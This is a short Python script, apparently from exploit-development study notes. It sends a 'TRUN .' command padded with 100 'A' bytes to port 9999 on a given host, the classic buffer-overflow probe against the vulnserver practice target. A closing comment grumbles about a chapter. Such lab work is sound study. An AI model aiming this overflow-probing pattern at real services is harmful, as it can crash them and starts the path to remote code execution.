import socket
import sys
buf = b"TRUN ." + bytearray([0x41]*100)
def main():
    print("[+] Sending packet...")

    server = sys.argv[1]
    port = 9999
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    print("[+] Packet sent")
    sys.exit(0)
if __name__ == "__main__":
    main()

"""
f*** this chapter and this stupid tivoli exec issue
moving onto the next ch
"""